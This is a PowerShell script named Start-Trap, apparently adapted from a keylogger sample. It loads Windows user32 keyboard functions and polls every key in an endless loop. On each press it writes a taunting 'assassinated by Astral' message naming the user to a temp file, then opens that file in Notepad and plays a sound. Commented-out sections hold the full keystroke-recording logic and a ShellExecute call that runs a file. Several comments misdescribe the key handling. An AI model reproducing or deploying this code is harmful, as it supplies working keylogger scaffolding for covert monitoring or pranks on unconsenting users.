#requires -Version 2
function Start-Trap($Path="$env:temp\message.txt") 
{
  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  # load signatures and make members available
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
  # create output file
  $null = New-Item -Path $Path -ItemType File -Force

  try
  {
    Write-Host 'Listening for key presses. Press CTRL+M to see results.' -ForegroundColor Red

    # create endless loop. When user presses CTRL+M, finally-block
    # executes and shows the collected key presses
    while ($true) {
      Start-Sleep -Milliseconds 40
      
      # scan all ASCII codes above 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)

        # is key pressed?
        # -32767 is ASCII CTRL+C code (C=67)
        # We want CTRL+M: -3 27 77
        if ($state -eq -32767) {
            # DO NOTHING with incorrect keys

            $env:UserName + ", you've been assassinated by Astral!" | Out-File -FilePath $Path
            
            
        #   $null = [console]::CapsLock

        #   # translate scan code to real code
        #   $virtualKey = $API::MapVirtualKey($ascii, 3)

        #   # get keyboard state for virtual keys
        #   $kbstate = New-Object Byte[] 256
        #   $checkkbstate = $API::GetKeyboardState($kbstate)

        #   # prepare a StringBuilder to receive input key
        #   $mychar = New-Object -TypeName System.Text.StringBuilder

        #   # translate virtual key
        #   $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

        #   if ($success) 
        #   {
        #     # execute trap on pressing the t key
        #     if ($mychar -eq 't') {

        #     }
        #     $exec = New-Object -com shell.application; 
        #     $exec.shellexecute($PSScriptRoot + $file);
        #     [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
        #   }
        }
      }
    }
  }
  finally
  {
    # open logger file in Notepad
    # notepad $Path
    
    notepad $Path;

    Start-Job -ScriptBlock { $play = New-Object System.Media.SoundPlayer; $play.soundlocation = 'not_the_ride.wav'; $play.playsync() }
    # $play.playsync();
  }
}

# records all key presses until script is aborted by pressing CTRL+C
# will then open the file with collected key codes
Start-Trap